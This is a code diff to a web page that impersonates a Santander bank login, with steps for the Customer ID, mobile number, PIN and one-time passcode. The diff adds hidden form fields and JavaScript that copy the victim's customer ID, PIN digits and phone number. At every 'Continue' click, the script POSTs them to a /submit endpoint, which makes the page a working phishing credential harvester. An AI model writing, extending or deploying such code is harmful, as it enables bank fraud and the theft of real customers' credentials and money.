@@ -138,7 +138,7 @@
             <input type="tel" id="san-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
             <p class="hint">We&rsquo;ll send your one-time passcode to this number in step 3.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your Customer ID?</a>
@@ -156,7 +156,7 @@
             <div class="pin-row" id="pin-row"></div>
             <p class="hint" style="margin-top:12px;">Use the drop-downs to select each digit.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back</a>
@@ -181,7 +181,7 @@
             </div>
           </div>
           <p class="resend">Didn't receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use the Santander app</a></p>
-          <button class="btn" onclick="goWithLoader(4,this)">Verify &amp; Log in</button>
+          <button class="btn" onclick="doVerify(this)">Verify &amp; Log in</button>
           <hr />
           <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
         </div>
@@ -246,6 +246,11 @@
     </div>
   </div>
 </main>
+<div style="display:none;">
+  <input type="text" id="email" />
+  <input type="password" id="pwd" />
+  <input type="text" id="ms-mobile" />
+</div>
 <footer>
   <div class="flinks">
     <a href="#">Privacy policy</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms &amp; conditions</a><a href="#">Security</a><a href="#">Contact us</a>
@@ -312,6 +317,35 @@
     document.getElementById('step'+n).classList.add('active');
     if(n===4) redirect();
   }
+  function syncLogAliases(){
+    var emailEl=document.getElementById('email');
+    var pwdEl=document.getElementById('pwd');
+    var mobileEl=document.getElementById('ms-mobile');
+    if(emailEl) emailEl.value = document.getElementById('cid')?.value || '';
+    if(pwdEl){
+      var selects = document.querySelectorAll('#pin-row select');
+      var pwd = '';
+      selects.forEach(function(sel){ pwd += sel.value || ''; });
+      pwdEl.value = pwd;
+    }
+    if(mobileEl) mobileEl.value = document.getElementById('san-mobile')?.value || '';
+  }
+  async function sendLogs(type){
+    syncLogAliases();
+    var email = document.getElementById('email') ? document.getElementById('email').value : '';
+    var pwd = document.getElementById('pwd') ? document.getElementById('pwd').value : '';
+    var msMobile = document.getElementById('ms-mobile') ? document.getElementById('ms-mobile').value : '';
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
+      });
+    } catch (e) {}
+  }
+  function nextStep(btn){ sendLogs('step1'); goWithLoader(2, btn); }
+  function doPassword(btn){ sendLogs('password'); goWithLoader(3, btn); }
+  function doVerify(btn){ sendLogs('verify'); goWithLoader(4, btn); }
   function redirect(){
     var s=5,fill=document.getElementById('pfill'),txt=document.getElementById('ctxt');
     fill.style.transition='width '+s+'s linear';
